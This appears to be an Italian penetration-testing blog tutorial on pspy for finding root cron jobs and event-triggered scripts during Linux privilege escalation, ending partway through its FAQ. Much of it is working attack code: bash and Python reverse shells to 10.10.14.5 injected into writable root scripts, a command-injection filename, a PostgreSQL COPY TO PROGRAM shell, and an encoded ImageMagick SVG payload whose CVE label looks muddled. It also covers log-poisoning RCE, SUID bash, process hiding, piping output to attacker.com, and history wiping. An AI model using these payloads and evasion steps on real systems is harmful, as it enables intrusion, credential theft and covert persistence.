---
title: 'Pspy: Monitoraggio Processi Linux Senza Privilegi Root'
slug: pspy
description: Pspy è uno strumento per osservare processi e cron job in esecuzione su Linux senza privilegi root. Ideale per identificare vettori di privilege escalation.
image: /Gemini_Generated_Image_wihpn1wihpn1wihp.webp
draft: false
date: 2026-02-22T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - privesc-linux
  - cron jobs
---

### Introduzione

pspy è un tool di monitoring che osserva processi Linux in tempo reale **senza richiedere permessi root**. A differenza di strumenti di enumeration classici che fanno snapshot del sistema, pspy rimane in ascolto e registra ogni nuovo processo che parte, mostrando il comando completo, l'utente che lo esegue, e l'esatto momento di esecuzione.

La killer feature di pspy è la capacità di **vedere processi di altri utenti (incluso root)** anche quando sei un utente non privilegiato. Questo funziona sfruttando il filesystem `/proc` di Linux che è readable da tutti. Quando un processo parte, anche per una frazione di secondo, pspy lo cattura. È perfetto per scoprire cron jobs che non appaiono in `/etc/crontab`, script automatici eseguiti da root, o task schedulati che girano solo in certi momenti.

Se hai mai fatto enumeration su un sistema Linux e pensato "deve esserci un cron job da qualche parte, ma non lo trovo", pspy è la risposta. Invece di cercare manualmente nei file di configurazione, lo lasci girare e aspetti. Prima o poi il processo misterioso partirà, e pspy te lo mostrerà con tutti i dettagli.

In questo articolo imparerai come usare pspy per scoprire vettori di privilege escalation invisibili alla enumeration statica, come interpretare il suo output real-time, quali pattern cercare, e come combinarlo con altri tool per exploitation completa. Vedrai esempi pratici di cron jobs che eseguono script writable, comandi con credenziali hardcoded, e task di root sfruttabili.

pspy si posiziona nella kill chain in **Post-Exploitation Enumeration**, specificamente per identificare processi periodici o event-triggered che la enumeration statica non cattura.

***

## 1️⃣ Setup e Installazione

### Download binari precompilati

pspy è scritto in Go e distribuito come **binary statico** (no dependencies). Esistono versioni per diverse architetture.

**Versioni disponibili:**

* `pspy32` - Linux 32-bit
* `pspy64` - Linux 64-bit
* `pspy32s` - Linux 32-bit (stripped, più piccolo)
* `pspy64s` - Linux 64-bit (stripped, più piccolo)

**Download da GitHub:**

```bash
# Versione 64-bit standard
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64

# Oppure versione stripped (più piccola, ~1.5MB vs 3MB)
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64s

# Permessi esecuzione
chmod +x pspy64
```

**Versione attuale:** v1.2.1 (controlla sempre GitHub releases per ultima versione)

### Verifica architettura target

Prima di trasferire pspy, verifica architettura del sistema target.

```bash
# Sul target
uname -m
# x86_64 → usa pspy64
# i686 → usa pspy32
# aarch64 → ARM 64-bit (scarica versione ARM se disponibile)

# Oppure
getconf LONG_BIT
# 64 → pspy64
# 32 → pspy32
```

### Trasferimento su target

**Metodo 1: HTTP server**

```bash
# Sul tuo attacker
python3 -m http.server 8000

# Sul target
cd /tmp
wget http://10.10.14.5:8000/pspy64
chmod +x pspy64
```

**Metodo 2: Base64 encoding (no network tools)**

```bash
# Sulla tua macchina
base64 pspy64 > pspy64.b64

# Sul target
cat << 'EOF' | base64 -d > /tmp/pspy64
[incolla base64 output]
EOF
chmod +x /tmp/pspy64
```

**Metodo 3: SCP (se hai SSH)**

```bash
scp pspy64 user@target:/tmp/
```

### Verifica funzionamento

```bash
./pspy64 -h
```

**Output atteso:**

```
pspy - version: 1.2.1 - Commit SHA: xxxxxxx

Usage:
  -p: print commands to stdout
  -f: print file system events to stdout  
  -i <interval>: milliseconds between scans (default: 100)
  -d <path>: directory to watch for file events
  -r: recursively watch directories

By default, pspy prints both process and file events.
```

Se vedi questo, pspy è ready.

***

## 2️⃣ Uso Base: Monitoring Processi

### Esecuzione standard

```bash
./pspy64
```

**Output real-time:**

```
pspy - version: 1.2.1 - Commit SHA: f9e6a1590a4312b9ffc5ad6d0e7e9d3f2e8c1234

2024/02/05 15:30:15 CMD: UID=0    PID=1      | /sbin/init
2024/02/05 15:30:15 CMD: UID=0    PID=245    | /usr/sbin/cron -f
2024/02/05 15:30:22 CMD: UID=33   PID=12456  | /usr/bin/php /var/www/html/index.php
2024/02/05 15:30:45 CMD: UID=0    PID=12789  | /bin/bash /opt/scripts/backup.sh
2024/02/05 15:30:46 CMD: UID=0    PID=12790  | /usr/bin/tar czf /backups/www.tar.gz /var/www
2024/02/05 15:30:47 CMD: UID=0    PID=12791  | /bin/rm -rf /tmp/backup_temp
```

🎓 **Come leggere l'output:**

* **Timestamp:** Quando il processo è partito
* **UID:** User ID (0 = root, 33 = www-data tipicamente)
* **PID:** Process ID
* **CMD:** Comando completo eseguito

**Pattern interessanti da cercare:**

* UID=0 (root) che esegue script in directory writable
* Comandi con password in chiaro (`mysql -p'password'`)
* Script in `/tmp` o `/home/user` eseguiti da root
* Backup scripts che copiano file sensibili

### Filtrare solo eventi processi (no file events)

```bash
./pspy64 -p
```

**Opzione `-p`** stampa solo process events, escludendo file system events (creazione/modifica file). Utile per ridurre noise.

### Monitorare directory specifiche

```bash
./pspy64 -d /opt/scripts -r
```

**Opzioni:**

* `-d /path` : Monitora directory specifica per file events
* `-r` : Recursive (include subdirectories)

Utile quando sai che script interessanti sono in una directory specifica.

### Intervallo di scanning

```bash
./pspy64 -i 1000
```

**Opzione `-i <ms>`** imposta intervallo in millisecondi tra scan (default: 100ms).

* `100ms` (default) = Alta frequenza, cattura processi molto rapidi, più CPU usage
* `1000ms` (1 secondo) = Frequenza normale, meno CPU, potrebbe perdere processi molto brevi

Per sistemi con risorse limitate o per stealth, usa intervallo maggiore.

***

## 3️⃣ Tecniche Operative (CORE)

### Scenario 1: Cron job discovery - Script writable

**Contesto:** Hai shell come `www-data` su web server. Enumeration statica (LinEnum, LSE) non ha trovato nulla. Decidi di lasciare pspy in background.

```bash
# Esecuzione pspy in background
./pspy64 > pspy_output.txt 2>&1 &

# Continua altre attività mentre pspy monitora
# Dopo 10-15 minuti, controlla output
cat pspy_output.txt | grep "UID=0" | tail -50
```

**Output trovato:**

```
2024/02/05 15:45:01 CMD: UID=0 PID=15234 | /bin/bash /opt/maintenance/cleanup.sh
2024/02/05 15:45:02 CMD: UID=0 PID=15235 | find /var/www/html -type f -mtime +30 -delete
2024/02/05 15:45:03 CMD: UID=0 PID=15236 | /usr/bin/chown -R www-data:www-data /var/www/html
```

🎓 **Analysis:** Root esegue `/opt/maintenance/cleanup.sh` ogni X minuti (cron). Verifica se writable:

```bash
ls -la /opt/maintenance/cleanup.sh
# -rwxrwxr-x 1 root www-data 234 Jan 15 2024 /opt/maintenance/cleanup.sh
#            ^^^^^^^^^^^
# Group www-data ha write! Tu sei www-data!
```

**Exploitation:**

```bash
# Aggiungi reverse shell allo script
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/maintenance/cleanup.sh

# Setup listener
nc -lvnp 4444

# Attendi prossima esecuzione cron
# [dopo alcuni minuti]
# Connection from target!
# root@target:/#
```

**Timeline:**

* pspy running: 10-15 min (attesa cron trigger)
* Analysis: 2 min
* Exploitation: 1 min
* **Totale: \~15-20 minuti**

**Cosa fare se fallisce:**

1. **Script non viene rieseguito:** Verifica frequenza cron. Potrebbe essere orario (ogni ora), daily, o event-triggered. Lascia pspy più a lungo.
2. **Permission denied editing script:** Forse permessi sono cambiati. Re-check con `ls -la`. Se davvero non writable, cerca altri vettori in output pspy.
3. **Reverse shell non connette:** Firewall outbound blocca. Usa bind shell: `nc -lvnp 5555 -e /bin/bash` e connetti dal tuo lato.

***

### Scenario 2: Credenziali in comandi eseguiti

**Contesto:** Sistema con multiple applications. Sospetti che qualche processo passi credenziali via command line.

```bash
./pspy64 | tee pspy_live.txt
```

**Output catturato:**

```
2024/02/05 16:10:33 CMD: UID=1001 PID=18456 | /usr/bin/mysql -h db.internal -u backup -p'Backup$ecret2024!' -e SELECT * FROM users
2024/02/05 16:10:34 CMD: UID=1001 PID=18457 | /usr/bin/mysqldump --all-databases -u root -p'R00tDB_P@ssw0rd!'
```

🎓 **Goldmine!** Password MySQL in chiaro nei command arguments.

**Exploitation:**

```bash
# Testa credenziali trovate
mysql -h db.internal -u root -p'R00tDB_P@ssw0rd!'
# mysql> ← Accesso come root al database!

# Enumeration database
mysql> SHOW DATABASES;
mysql> USE webapp_production;
mysql> SELECT username, password FROM admin_users;
# +----------+----------------------------------+
# | username | password (hash)                  |
# +----------+----------------------------------+
# | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |

# Cracka hash offline o usa per lateral movement
```

**Alternative exploitation:**

Se [MySQL](https://hackita.it/articoli/porta-3306-mysql/) è solo interno, usa **password reuse**:

```bash
# Testa root DB password su SSH
ssh root@target
# Password: R00tDB_P@ssw0rd!
# Last login: ...
# root@target:~# ← Password reuse!
```

**Timeline:** 5-10 minuti di monitoring per catturare cron DB backup.

Per approfondire tecniche di credential harvesting e password spraying, esplora la nostra sezione [articoli](https://hackita.it/articoli).

***

### Scenario 3: Event-triggered scripts

**Contesto:** Application server che processa file upload. Sospetti che ci sia script automatico che processa uploads.

```bash
# Monitora specificamente /var/www/uploads
./pspy64 -d /var/www/uploads -r
```

**Test trigger:**

```bash
# In altra shell, simula upload
cp /etc/passwd /var/www/uploads/test.txt
```

**pspy output:**

```
2024/02/05 16:25:12 FS: CLOSE_WRITE | /var/www/uploads/test.txt
2024/02/05 16:25:13 CMD: UID=0 PID=19234 | /usr/bin/python3 /opt/process_upload.py /var/www/uploads/test.txt
2024/02/05 16:25:14 CMD: UID=0 PID=19235 | /usr/bin/convert /var/www/uploads/test.txt /var/www/processed/test.png
```

🎓 **Discovery:** File upload triggera script Python come root!

**Exploitation via command injection:**

```bash
# Verifica se process_upload.py è vulnerable
cat /opt/process_upload.py
# ...
# subprocess.call(f"convert {filename} {output}")  ← NO SANITIZATION!

# Exploit: crea file con nome malevolo
touch '/var/www/uploads/; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 #.txt'

# pspy mostra:
# CMD: UID=0 | /bin/bash -c convert /var/www/uploads/; bash -i >& /dev/tcp/10.10.14.5/4444 0>&1 #.txt ...

# Root shell ricevuta!
```

**Timeline:** 5 minuti (discovery + exploitation)

***

## 4️⃣ Tecniche Avanzate

### Long-term monitoring con rotation logs

Per monitoring esteso (ore/giorni), implementa log rotation per evitare file giganti.

```bash
#!/bin/bash
# pspy_monitor.sh

while true; do
    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    timeout 3600 ./pspy64 -p > "pspy_log_${TIMESTAMP}.txt" 2>&1
    
    # Comprimi log vecchi
    find . -name "pspy_log_*.txt" -mmin +60 -exec gzip {} \;
    
    # Rimuovi log compressi >24h
    find . -name "pspy_log_*.txt.gz" -mtime +1 -delete
    
    sleep 10
done
```

Questo esegue pspy per 1 ora, salva log, comprime, e ripete. Dopo 24h, cleanup automatico.

### Pattern matching per automated alerting

Script che analizza output pspy in real-time e allerta su pattern interessanti.

```bash
#!/bin/bash
# pspy_alerts.sh

./pspy64 -p | while read line; do
    echo "$line" >> pspy_full.log
    
    # Alert su root processes con password
    if echo "$line" | grep -q "UID=0.*-p'" || echo "$line" | grep -q "UID=0.*password"; then
        echo "[!] ALERT: Root process with password detected!" >&2
        echo "$line" >> pspy_alerts.log
    fi
    
    # Alert su scripts in /tmp eseguiti da root
    if echo "$line" | grep -q "UID=0.*/tmp/"; then
        echo "[!] ALERT: Root executing script in /tmp!" >&2
        echo "$line" >> pspy_alerts.log
    fi
done
```

**Output:**

```
[!] ALERT: Root process with password detected!
2024/02/05 17:15:22 CMD: UID=0 | mysql -u backup -p'SecretPass123'
```

Permette monitoring passivo: lasci girare pspy, e vieni notificato solo quando trova qualcosa di interessante.

### Correlazione con [LinEnum](https://hackita.it/articoli/linenum/)/pspy combo

Combina enumeration statica (LinEnum) con monitoring dinamico (pspy).

**Workflow:**

```bash
# Step 1: LinEnum per baseline
./LinEnum.sh > linenum.txt

# Step 2: Identifica possibili cron paths da LinEnum
grep "cron" linenum.txt
# */5 * * * * root /opt/scripts/backup.sh (da /etc/crontab)

# Step 3: pspy per verificare esecuzione reale
./pspy64 | grep "/opt/scripts/backup.sh"
# Attendi...
# 2024/02/05 17:20:01 CMD: UID=0 | /opt/scripts/backup.sh

# Step 4: Analizza script
ls -la /opt/scripts/backup.sh
cat /opt/scripts/backup.sh
```

LinEnum trova configurazione, pspy conferma esecuzione e mostra esatto momento + argomenti.

### Stealth monitoring: process hiding

pspy stesso è visibile in `ps`. Per red team, nascondilo.

```bash
# Metodo 1: Rinomina processo
cp pspy64 /tmp/.systemd-check
/tmp/.systemd-check -p > /dev/null &

# In ps appare come: .systemd-check

# Metodo 2: LD_PRELOAD process hiding (avanzato)
# Richiede libprocesshider.so compilata
LD_PRELOAD=./libprocesshider.so ./pspy64 &
# pspy non appare in ps
```

**Nota:** Stealth completo è difficile. Anche nascondendo dal ps, monitoring network o disk I/O può rilevare pspy.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario A: CTF - Hidden cron job discovery

**Contesto:** CTF box Linux. Hai shell come `user`. Flag è in `/root/root.txt`. Enumeration classica non trova nulla.

```bash
# COMANDO - pspy in background mentre esplori
./pspy64 -p > /tmp/.pspy.log 2>&1 &
PID=$!

# Fai altre cose (enumeration manuale, ricerca SUID, etc)
# Dopo 5-10 minuti, check pspy
kill $PID
cat /tmp/.pspy.log | grep "UID=0"
```

**OUTPUT TROVATO:**

```
2024/02/05 18:05:01 CMD: UID=0 PID=25678 | /usr/bin/python3 /home/user/cleanup.py
2024/02/05 18:05:02 CMD: UID=0 PID=25679 | /bin/rm -rf /home/user/.cache/*
```

🎓 **Analysis:** Root esegue `/home/user/cleanup.py` ogni 5 minuti!

**Verification:**

```bash
ls -la /home/user/cleanup.py
# -rw-rw-r-- 1 user user 145 Feb 01 2024 cleanup.py
# Writable by user!

cat cleanup.py
```

```python
#!/usr/bin/env python3
import os
import shutil

# Cleanup old cache
cache_dir = "/home/user/.cache"
if os.path.exists(cache_dir):
    shutil.rmtree(cache_dir)
```

**EXPLOITATION:**

```bash
# Aggiungi reverse shell
cat >> cleanup.py << 'EOF'

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.5",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF

# Listener
nc -lvnp 4444

# Attendi max 5 minuti (cron interval)
# Root shell ricevuta!
cat /root/root.txt
```

**COSA FARE SE FALLISCE:**

* **Script non rieseguito:** Cron potrebbe essere più infrequente (ogni 10, 15, 30 min). Lascia pspy più a lungo.
* **Python syntax error:** Attento all'indentazione. Usa `python3 -m py_compile cleanup.py` per test syntax.
* **Connection refused:** Firewall o network segmentation. Usa bind shell invece.

**Timeline:** 10-15 min (wait cron) + 2min exploitation

***

### Scenario B: Enterprise pentest - Database backup credentials

**Contesto:** Hai compromesso application server (utente `webapp`). Devi fare lateral movement verso database server.

```bash
# COMANDO - pspy focus su processi root
./pspy64 -p | grep "UID=0" | tee pspy_root.log
```

**OUTPUT DOPO 20 MINUTI:**

```
2024/02/05 19:00:01 CMD: UID=0 PID=28456 | /usr/bin/pg_dump -h postgres.internal.corp -U backup -W PostgresBackup2024! webapp_db
2024/02/05 19:00:05 CMD: UID=0 PID=28457 | /usr/bin/scp /backups/webapp_db.sql backup@backup-server.corp:/mnt/backups/
```

🎓 **Goldmine:** Password PostgreSQL + hostname DB server!

**EXPLOITATION:**

```bash
# Testa credenziali DB
psql -h postgres.internal.corp -U backup -d webapp_db
# Password: PostgresBackup2024!
# webapp_db=> ← Accesso!

# Enumeration database
webapp_db=> \dt
# Lista tabelle

webapp_db=> SELECT * FROM users WHERE role='admin';
# Dumpa admin users

# Se DB user ha privilegi elevati
webapp_db=> \du
# List of roles
# backup | Superuser, Create role, Create DB | {}

# Superuser = può leggere qualsiasi dato, eseguire comandi OS
webapp_db=> COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"';
# RCE via PostgreSQL COPY!
```

**Timeline:** 20 min monitoring + 5 min exploitation

Se vuoi approfondire tecniche di exploitation database e SQL injection avanzate, leggi [privilege escalation tramite database misconfiguration](https://hackita.it/articoli/database-privilege-escalation/).

***

### Scenario C: Event-triggered vulnerability in file processing

**Contesto:** Web application permette upload immagini. Sospetti processing automatico server-side.

```bash
# COMANDO - Monitor uploads directory
./pspy64 -d /var/www/uploads -r -p
```

**TEST TRIGGER:**

```bash
# Upload file via web interface o curl
curl -F "file=@test.jpg" http://target.com/upload
```

**pspy OUTPUT:**

```
2024/02/05 20:15:33 FS: CLOSE_WRITE | /var/www/uploads/test.jpg
2024/02/05 20:15:34 CMD: UID=33 PID=31245 | /usr/bin/exiftool /var/www/uploads/test.jpg
2024/02/05 20:15:35 CMD: UID=0  PID=31246 | /usr/bin/convert /var/www/uploads/test.jpg -resize 800x600 /var/www/thumbs/test_thumb.jpg
```

🎓 **Findings:**

1. `exiftool` (UID=33, www-data) - safe
2. `convert` (UID=0, root) - **DANGEROUS!**

**EXPLOITATION - ImageMagick RCE:**

```bash
# ImageMagick (convert) ha CVE noti per RCE
# Crea polyglot image con payload

# Genera malicious SVG (CVE-2022-44268)
cat > exploit.svg << 'EOF'
<image authenticate='ff" `echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjUvNDQ0NCAwPiYx | base64 -d | bash`;"'>
  <read filename="pdf:/etc/passwd"/>
  <get width="base-width" height="base-height" />
  <resize geometry="400x400" />
  <write filename="test.png" />
  <svg width="700" height="700" xmlns="http://www.w3.org/2000/svg">
  <image xlink:href="msl:exploit.svg" height="100" width="100"/>
  </svg>
</image>
EOF

# Upload via web
curl -F "file=@exploit.svg" http://target.com/upload

# Listener
nc -lvnp 4444
# Root shell quando convert process l'immagine!
```

**Timeline:** 10 min (discovery + exploitation)

***

## 6️⃣ Toolchain Integration

### Pre-pspy: Enumeration statica

Prima di pspy, esegui enumeration statica per baseline.

```bash
# LinEnum/LSE/LinPEAS per snapshot
./LinEnum.sh > linenum.txt

# Identifica possibili cron jobs
grep -i "cron" linenum.txt
# Molte volte trovi: /etc/crontab entries

# Ma cron user-specific potrebbero mancare!
# /var/spool/cron/crontabs/user potrebbe essere unreadable

# pspy risolve questo problema
./pspy64  # Cattura TUTTE le esecuzioni, non solo config files
```

***

### pspy + GTFOBins workflow

pspy trova comando con sudo, GTFOBins fornisce exploitation.

**Esempio:**

```bash
# pspy output
CMD: UID=1000 | sudo /usr/bin/systemctl status webapp

# Verifica sudo permission
sudo -l
# User user may run: (ALL) NOPASSWD: /usr/bin/systemctl status webapp

# GTFOBins lookup
curl -s https://gtfobins.github.io/gtfobins/systemctl/ | grep -A10 "sudo"

# Exploitation
sudo systemctl status webapp
# In pager, digita:
!sh
# root shell
```

GTFOBins è cruciale per sapere **come** abusare comandi che pspy scopre. Puoi approfondire l'uso di GTFOBins nella nostra [guida completa al databa](https://hackita.it/articoli/gtfobins/)[guida completa al database GTFOBins per privilege escalation](https://hackita.it/articoli/gtfobins/)

***

### Post-pspy: Exploitation tools

pspy identifica vulnerabilità, poi usi tool specifici.

**pspy → [Metasploit](https://hackita.it/articoli/metasploit/):**

```bash
# pspy trova vulnerable ImageMagick
CMD: UID=0 | convert input.jpg output.png

# Metasploit exploitation
msfconsole
use exploit/unix/fileformat/imagemagick_delegate
set LHOST 10.10.14.5
generate
# Carica image generata via web upload
```

**pspy → Manual scripting:**

```bash
# pspy trova writable cron script
CMD: UID=0 | /opt/scripts/backup.sh

ls -la /opt/scripts/backup.sh
# -rwxrwxrwx (world-writable!)

# Script custom per exploitation
echo '#!/bin/bash' > /tmp/exploit.sh
echo 'cp /bin/bash /tmp/rootbash' >> /tmp/exploit.sh
echo 'chmod 4755 /tmp/rootbash' >> /tmp/exploit.sh
cat /tmp/exploit.sh >> /opt/scripts/backup.sh

# Attendi esecuzione cron
# Poi:
/tmp/rootbash -p
# root shell
```

***

### Comparazione: pspy vs Altri Tools

| **Feature**             | **pspy**               | **LinEnum**          | **LinPEAS**          | **auditd**                |
| ----------------------- | ---------------------- | -------------------- | -------------------- | ------------------------- |
| **Monitoring type**     | Real-time              | Static snapshot      | Static snapshot      | Real-time (requires root) |
| **Root required**       | ❌ No                   | ❌ No                 | ❌ No                 | ✅ Yes                     |
| **Catches hidden cron** | ✅ Yes                  | ⚠️ Only if in config | ⚠️ Only if in config | ✅ Yes                     |
| **Shows command args**  | ✅ Full command         | ⚠️ Limited           | ⚠️ Limited           | ✅ Full                    |
| **Resource usage**      | 🟡 Medium (continuous) | 🟢 Low (one-time)    | 🟡 Medium (one-time) | 🔴 High                   |
| **Stealth**             | 🟡 Medium              | 🟢 Low noise         | 🔴 High noise        | 🟢 System tool            |
| **Best for**            | Process discovery      | Quick enum           | Full audit           | Production monitoring     |

**Decision matrix:**

Use **pspy** when:
✅ Enumeration statica non trova cron jobs
✅ Sospetti processi periodici o event-triggered
✅ Vuoi vedere argomenti completi di comandi
✅ Hai tempo per lasciarlo in monitoring (10+ minuti)

**Avoid pspy** when:
❌ Hai già trovato vettori con static enumeration (usa tempo altrove)
❌ Sistema con CPU limitata (pspy consuma \~5-10% continuous)
❌ Need immediate results (pspy richiede waiting time)

***

## 7️⃣ Attack Chain Completa

### From Web Shell to Root via pspy Process Discovery

***

**FASE 1: Initial Access - [LFI](https://hackita.it/articoli/lfi/) to [RCE](https://hackita.it/articoli/rce/)**

```bash
# Vulnerable parameter
curl "http://target.com/page.php?file=../../../etc/passwd"
# Works! LFI vulnerability

# PHP filter chain to RCE
curl "http://target.com/page.php?file=php://filter/convert.base64-encode/resource=../../../var/log/apache2/access.log"

# Log poisoning
curl "http://target.com/" -A "<?php system(\$_GET['cmd']); ?>"

# RCE
curl "http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=id"
# uid=33(www-data)
```

**Timeline:** 10 minuti

***

**FASE 2: Shell Upgrade + pspy Transfer**

```bash
# Reverse shell
curl "http://target.com/page.php?file=../../../var/log/apache2/access.log&cmd=python3%20-c%20'import%20socket,subprocess;[...]'"

# Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Transfer pspy
www-data@target:/tmp$ wget http://10.10.14.5:8000/pspy64
www-data@target:/tmp$ chmod +x pspy64
```

**Timeline:** 3 minuti

***

**FASE 3: pspy Monitoring (Background)**

```bash
www-data@target:/tmp$ ./pspy64 -p > pspy.log 2>&1 &
[1] 12456

# Continua enumeration manuale mentre pspy monitora
www-data@target:/tmp$ find / -perm -4000 2>/dev/null
www-data@target:/tmp$ sudo -l
# [nulla di utile trovato]
```

**Timeline:** 15 minuti (monitoring)

***

**FASE 4: pspy Discovery**

```bash
# Dopo 15 min, check pspy
www-data@target:/tmp$ cat pspy.log | grep "UID=0" | tail -20
```

**Output:**

```
2024/02/05 21:30:01 CMD: UID=0 PID=15678 | /usr/sbin/CRON -f
2024/02/05 21:30:01 CMD: UID=0 PID=15679 | /bin/sh -c /opt/monitoring/check_services.sh
2024/02/05 21:30:02 CMD: UID=0 PID=15680 | /bin/bash /opt/monitoring/check_services.sh
```

**Analysis:**

```bash
www-data@target:/tmp$ ls -la /opt/monitoring/check_services.sh
# -rwxrwxr-x 1 root www-data 256 Jan 15 2024 check_services.sh
# Group www-data writable!
```

**Timeline:** 2 minuti

***

**FASE 5: Privilege Escalation**

```bash
# Inject reverse shell
www-data@target:/tmp$ echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/monitoring/check_services.sh

# Listener
nc -lvnp 4444

# Attendi prossima esecuzione (ogni 5 min secondo pspy pattern)
# [5 minuti dopo]
# Connection from target:45678
# root@target:/# 

root@target:/# cat /root/root.txt
```

**Timeline:** 5 minuti (wait cron)

***

**TOTALE:** \~35 minuti da LFI discovery a root flag.

**Tools usati:**

1. [cURL](https://hackita.it/articoli/curl/) (web exploitation)
2. Python (reverse shell)
3. **pspy** (process discovery - KEY TOOL)
4. [Netcat](https://hackita.it/articoli/netcat/) (shell listener)

**Ruolo critico di pspy:** Senza pspy, cron job nascosto sarebbe rimasto invisibile. Enumeration statica non lo aveva trovato perché era user-specific cron (`/var/spool/cron/crontabs/root` unreadable). pspy ha catturato l'esecuzione real-time.

***

## 8️⃣ Detection & Evasion

### Cosa monitora il Blue Team

**Process monitoring:**

```bash
# EDR cerca pattern tipo:
process_name = pspy*
command_line CONTAINS "/proc/*/cmdline"
parent_process = www-data OR apache2
```

pspy legge `/proc` continuamente, questo genera patterns rilevabili.

**File access patterns:**

```bash
# auditd rule tipica
-w /proc -p r -k proc_read

# pspy triggera:
type=SYSCALL syscall=openat name=/proc/12345/cmdline success=yes
```

**Resource usage:**

pspy usa CPU constant (\~5-10%). SIEM cerca "sustained CPU usage from web process".

***

### Tecniche di evasion

**1. Rename binary**

```bash
cp pspy64 /tmp/.systemd-udevd
/tmp/.systemd-udevd -p > /dev/null &

# In ps appare come: .systemd-udevd (sembra legit)
```

***

**2. Nice priority (lower CPU footprint)**

```bash
nice -n 19 ./pspy64 -i 1000 -p > /dev/null &

# -n 19 = lowest priority
# -i 1000 = scan ogni 1 secondo invece di 100ms (meno CPU)
```

**Risultato:** CPU usage scende da 8% a 2-3%.

***

**3. Output redirection (no disk artifact)**

```bash
./pspy64 -p | nc attacker.com 4444
# Zero file su disco
```

***

**4. Intermittent monitoring (on/off pattern)**

```bash
#!/bin/bash
while true; do
    timeout 60 ./pspy64 -p >> /tmp/.cache 2>&1
    sleep 300  # 5 min pause
done
```

**Rationale:** Monitoring continuo = pattern rilevabile. Intermittent = più difficile da detectare.

***

### Cleanup post-monitoring

```bash
# Kill pspy
killall pspy64

# Rimuovi binary
rm /tmp/pspy64 /tmp/.systemd-udevd

# Rimuovi logs
rm /tmp/pspy.log /tmp/.cache

# Clear bash history
history -c
```

**Timeline:** 30 secondi

***

## 9️⃣ Performance & Scaling

### Resource usage benchmark

Test su Ubuntu 20.04 (2 CPU, 4GB RAM):

| **Scan Interval** | **CPU Usage** | **Memory** | **Processes Captured** |
| ----------------- | ------------- | ---------- | ---------------------- |
| 100ms (default)   | 8-10%         | 12MB       | \~99% accuracy         |
| 500ms             | 4-6%          | 12MB       | \~95% accuracy         |
| 1000ms            | 2-3%          | 12MB       | \~90% accuracy         |
| 5000ms            | 1%            | 12MB       | \~70% accuracy         |

**Conclusione:** Interval 100-500ms è sweet spot. Sotto 100ms non migliora accuracy significativamente. Sopra 1000ms rischi di perdere processi rapidi.

***

### Multi-target deployment

**Scenario:** Monitoring su 10 server compromessi.

```bash
# Script automation
for host in $(cat targets.txt); do
  (
    ssh user@$host 'wget -q http://10.10.14.5/pspy64 -O /tmp/.mon && chmod +x /tmp/.mon && nohup /tmp/.mon -p > /tmp/.log 2>&1 &'
    echo "[+] pspy started on $host"
  ) &
done
wait

# Dopo 30 min, fetch results
for host in $(cat targets.txt); do
  scp user@$host:/tmp/.log "results/pspy_$host.log"
done

# Analisi batch
grep -h "UID=0" results/*.log | sort -u
```

**Timeline:** \~5 minuti setup + 30 min monitoring + 5 min retrieval

***

## 10️⃣ Tabelle Tecniche

### Command Reference

| **Comando**            | **Funzione**                  | **Use Case**                 |
| ---------------------- | ----------------------------- | ---------------------------- |
| `./pspy64`             | Monitor process + file events | Standard usage               |
| `./pspy64 -p`          | Solo process events           | Riduce noise                 |
| `./pspy64 -f`          | Solo file events              | Monitor filesystem activity  |
| `./pspy64 -i 1000`     | Scan ogni 1 secondo           | Low resource systems         |
| `./pspy64 -d /path -r` | Monitor directory specifica   | Focus su path interessante   |
| `./pspy64 > log.txt &` | Background monitoring         | Long-term passive monitoring |
| `nice -n 19 ./pspy64`  | Low priority                  | Stealth, riduce CPU          |

***

### Pattern Recognition Guide

Cosa cercare nell'output pspy:

| **Pattern**                 | **Significato**            | **Exploitation**              |
| --------------------------- | -------------------------- | ----------------------------- |
| `UID=0 ... /tmp/script.sh`  | Root esegue script in /tmp | Se writable = injection       |
| `UID=0 ... -p'password'`    | Password in command line   | Credential harvesting         |
| `UID=0 ... /home/user/file` | Root accede home user      | Se file writable = privesc    |
| `UID=X ... sudo command`    | User X ha sudo             | Check `sudo -l` per abuse     |
| `Repeating every N minutes` | Cron job                   | Identifica frequency, exploit |
| `UID=0 ... curl http://`    | Root downloading           | MITM possible                 |

***

## 11️⃣ Troubleshooting

### pspy non cattura processi

**Causa:** Scan interval troppo lento, processi troppo rapidi.

**Fix:**

```bash
# Aumenta frequency
./pspy64 -i 50  # Scan ogni 50ms invece di 100ms

# Oppure usa strace per debug
strace -e openat ./pspy64 2>&1 | grep proc
```

***

### "Permission denied" accessing /proc

**Causa:** Alcuni kernel hanno `/proc` restricted. Raro ma possibile.

**Fix:**

```bash
# Verifica permessi /proc
ls -la /proc | head
# dr-xr-xr-x ... /proc

# Se permessi strani, prova con sudo (se hai)
sudo ./pspy64
```

***

### pspy consuma troppa CPU

**Fix:**

```bash
# Riduce interval + nice priority
nice -n 19 ./pspy64 -i 2000

# Oppure intermittent monitoring
timeout 60 ./pspy64 && sleep 120
```

***

### Output troppo verboso

**Fix:**

```bash
# Filtra solo root processes
./pspy64 -p | grep "UID=0"

# Oppure salva e analizza offline
./pspy64 > full.log &
# [dopo tempo]
grep "interessante_keyword" full.log
```

***

## 12️⃣ FAQ

**Q: pspy può vedere processi di TUTTI gli utenti senza root?**

A: Sì! Funziona leggendo `/proc` che è world-readable su Linux. Quando un processo parte, anche per millisecondi, crea entry in `/proc/PID/`. pspy scanna `/proc` rapidamente e cattura queste entry prima che spariscano. Limitazione: non vedi processi già running prima di avviare pspy.

***

**Q: Perché pspy è meglio di `ps aux` in loop?**

